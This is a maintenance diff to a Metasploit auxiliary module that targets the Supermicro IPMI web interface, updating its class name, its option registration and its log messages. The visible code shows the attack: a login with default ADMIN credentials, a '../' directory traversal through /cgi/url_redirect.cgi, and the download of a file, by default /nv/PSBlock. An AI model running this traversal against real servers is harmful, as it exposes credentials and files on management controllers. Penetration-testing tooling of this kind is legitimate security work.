@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -47,7 +45,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),
         OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN']),
         OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN'])
-      ], self.class)
+      ])
   end
 
   def my_basename(filename)
@@ -90,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
     travs << "../" * datastore['DEPTH']
     travs << file
 
-    print_status("#{peer} - Retrieving file contents...")
+    print_status("Retrieving file contents...")
 
     res = send_request_cgi({
       "uri"           => "/cgi/url_redirect.cgi",
@@ -111,26 +109,26 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    print_status("#{peer} - Checking if it's a #{APP_NAME}....")
+    print_status("Checking if it's a #{APP_NAME}....")
     if is_supermicro?
-      print_good("#{peer} - Check successful")
+      print_good("Check successful")
     else
-      print_error("#{peer} - #{APP_NAME} not found")
+      print_error("#{APP_NAME} not found")
       return
     end
 
-    print_status("#{peer} - Login into the #{APP_NAME}...")
+    print_status("Login into the #{APP_NAME}...")
     session = login
     if session.nil?
-      print_error("#{peer} - Failed to login, check credentials.")
+      print_error("Failed to login, check credentials.")
       return
     else
-      print_good("#{peer} - Login successful, session: #{session}")
+      print_good("Login Successful, session: #{session}")
     end
 
     contents = read_file(datastore['FILEPATH'], session)
     if contents.nil?
-      print_error("#{peer} - File not downloaded")
+      print_error("File not downloaded")
       return
     end
 
@@ -142,7 +140,6 @@ class Metasploit3 < Msf::Auxiliary
       contents,
       file_name
     )
-    print_good("#{peer} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
   end
-
 end
